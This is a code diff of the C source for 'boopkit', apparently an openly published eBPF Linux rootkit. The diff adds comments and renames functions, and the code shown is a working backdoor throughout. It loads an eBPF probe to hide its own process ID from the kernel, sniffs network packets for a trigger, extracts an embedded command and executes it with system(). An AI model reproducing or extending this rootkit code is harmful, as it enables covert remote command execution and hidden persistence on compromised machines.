@@ -123,6 +123,9 @@ int recvrce(char dial[INET_ADDRSTRLEN], char *rce) {
   return 1;
 }
 
+/**
+ * config is the CLI options that are used throughout boopkit
+ */
 struct config {
   int sudobypass;
   char pr0besafepath[PATH_MAX];
@@ -134,6 +137,12 @@ struct config {
   char deny[MAX_DENY_ADDRS][INET_ADDRSTRLEN];
 } cfg;
 
+/**
+ * clisetup is used to initalize the program from the command line
+ * 
+ * @param argc 
+ * @param argv 
+ */
 void clisetup(int argc, char **argv) {
   cfg.denyc = 0;
   cfg.reverseconn = 0;
@@ -175,18 +184,37 @@ void clisetup(int argc, char **argv) {
   }
 }
 
+/**
+ * Shared memory with the kernel
+ */
 static struct env {
   int pid_to_hide;
   int target_ppid;
 } env;
 
-// handlepidlookup is called everytime the kernel searches for our pid.
-static int handlepidlookup(void *ctx, void *data, size_t data_sz) {
+/**
+ * cb_pid_lookup is a callback function for PID lookup at runtime
+ * used in obfuscating boopkit from the rest of the kernel.
+ * 
+ * @param ctx 
+ * @param data 
+ * @param data_sz 
+ * @return 
+ */
+static int cb_pid_lookup(void *ctx, void *data, size_t data_sz) {
   // const struct event *e = data;
   return 0;
 }
 
-void rootcheck(int argc, char **argv) {
+/**
+ * uid_check is used to check the runtime construct of boopkit
+ *
+ * Ideally boopkit is ran without sudo as uid=0 (root)
+ *
+ * @param argc 
+ * @param argv 
+ */
+void uid_check(int argc, char **argv) {
   long luid = (long)getuid();
   if (luid != 0) {
     boopprintf("  XX Invalid UID.\n");
@@ -217,11 +245,16 @@ void rootcheck(int argc, char **argv) {
   boopprintf("  -> getppid()               : %ld\n", lppid);
 }
 
+/**
+ * exec is where the magic happens.
+ *
+ * @param rce
+ * @return
+ */
 int exec(char *rce) {
   char *ret;
   ret = strstr(rce, BOOPKIT_RCE_CMD_HALT);
   if (ret) {
-    // Halt!
     runtime__xcap    = 0; // Stop the xcap loop
     runtime__boopkit = 0; // Stop the boopkit loop
     boopprintf("  XX Halting boopkit: %s\n", ret);
@@ -229,32 +262,36 @@ int exec(char *rce) {
     return 0;
   }
   boopprintf("  <- Executing: %s\n", rce);
-  system(rce);
+  system(rce); // :)
   free(rce);
   return 1;
 }
 
+/**
+ * main
+ *
+ * @param argc
+ * @param argv
+ * @return
+ */
 int main(int argc, char **argv) {
   clisetup(argc, argv);
   asciiheader();
-  rootcheck(argc, argv);
+  uid_check(argc, argv);
   boopprintf("  -> Logs                    : /sys/kernel/tracing/trace_pipe\n");
 
-  int loaded, err;
-  struct bpf_object *bpobj;
-  struct pr0be_safe *sfobj;
+  int    loaded, err;
+  struct bpf_object  *bpobj;
+  struct pr0be_safe  *sfobj;
   struct bpf_program *progboop = NULL;
   struct ring_buffer *rb = NULL;
-  char pid[16];
+  char   pid[16];
 
-  // ===========================================================================
-  // [xcap]
   {
     // Start a new thread for DPI. @zomgwtfbbqkewl
     pthread_t th;
     pthread_create(&th, NULL, xcap, (void *)cfg.dev_name);
   }
-  // ===========================================================================
 
   // ===========================================================================
   // [pr0be.safe.o]
@@ -262,9 +299,6 @@ int main(int argc, char **argv) {
     boopprintf("  -> Loading eBPF Probe      : %s\n", cfg.pr0besafepath);
     sfobj = pr0be_safe__open();
     // getpid()
-    //
-    // Note: We know that we can use getpid() as the rootcheck() function above
-    //       will manage ensuring we are executing this program without sudo
     env.pid_to_hide = getpid();
     sprintf(pid, "%d", env.pid_to_hide);
     strncpy(sfobj->rodata->pid_to_hide, pid,
@@ -301,7 +335,7 @@ int main(int argc, char **argv) {
       boopprintf("Failed to attach %s\n", cfg.pr0besafepath);
       return 1;
     }
-    rb = ring_buffer__new(bpf_map__fd(sfobj->maps.rb), handlepidlookup, NULL,
+    rb = ring_buffer__new(bpf_map__fd(sfobj->maps.rb), cb_pid_lookup, NULL,
                           NULL);
     if (!rb) {
       boopprintf("Failed to create ring buffer\n");
@@ -378,7 +412,6 @@ int main(int argc, char **argv) {
       inet_ntop(AF_INET, &saddrbytes, saddrval, sizeof(saddrval));
       boopprintf("  ** Boop source: %s\n", saddrval);
 
-
       // Filter boop addrs
       ignore = 0;
       for (int i = 0; i < cfg.denyc; i++) {
@@ -402,7 +435,7 @@ int main(int argc, char **argv) {
       // Always check for RCE in the ring buffer.
       char *rce = malloc(MAX_RCE_SIZE);
       int xcap_found;
-      // Check the packet buffer for the value to execute.
+
       xcap_found = xcaprce(saddrval, rce);
       if (xcap_found == 1) {
         exec(rce);
